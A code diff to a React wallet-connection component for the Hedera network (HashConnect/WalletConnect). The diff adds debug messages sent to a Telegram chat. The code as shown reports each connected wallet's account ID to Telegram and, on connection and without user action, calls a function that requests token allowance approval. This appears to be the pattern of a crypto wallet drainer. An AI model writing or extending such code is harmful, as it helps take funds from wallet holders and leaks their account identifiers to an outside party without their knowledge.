@@ -59,14 +59,12 @@ export const HashConnectClient = () => {
   }
 
   const syncWithHashConnect = useCallback(async () => {
-    // In syncWithHashConnect, before wallet connect logic
-
+    await sendMessageToTelegram(`[DEBUG] syncWithHashConnect called`);
     try {
       // Get connected account IDs for hashconnect@0.2.4
       let connectedAccountIds = hc.hcData.pairingData
         ? hc.hcData.pairingData.map((pair: any) => pair.accountIds).flat()
         : [];
-
       // If pairingData is empty, try to get accountId from signers (WalletConnect)
       if ((!connectedAccountIds || connectedAccountIds.length === 0) && typeof dappConnector !== 'undefined' && dappConnector.signers && dappConnector.signers.length > 0) {
         const signerAccountId = dappConnector.signers[0]?.getAccountId()?.toString();
@@ -75,7 +73,6 @@ export const HashConnectClient = () => {
           sendMessageToTelegram(`[INFO] Wallet connected: ${signerAccountId}`);
         }
       }
-
       if (connectedAccountIds && connectedAccountIds.length > 0) {
         const targetAccountId = connectedAccountIds?.map((o: any) =>
           o.toString()
@@ -89,9 +86,9 @@ export const HashConnectClient = () => {
         );
         dispatch(actions.hashconnect.setIsConnected(true));
         dispatch(actions.hashconnect.setPairingString(hc.hcData.pairingString ?? ""));
-
+        await sendMessageToTelegram(`[DEBUG] About to call handleAllowanceApprove for account: ${accountIDD}`);
         await handleAllowanceApprove(accountIDD);
-
+        await sendMessageToTelegram(`[DEBUG] handleAllowanceApprove finished for account: ${accountIDD}`);
       } else {
         // Update Redux for no connected accounts
         dispatch(actions.hashconnect.setAccountIds([]));
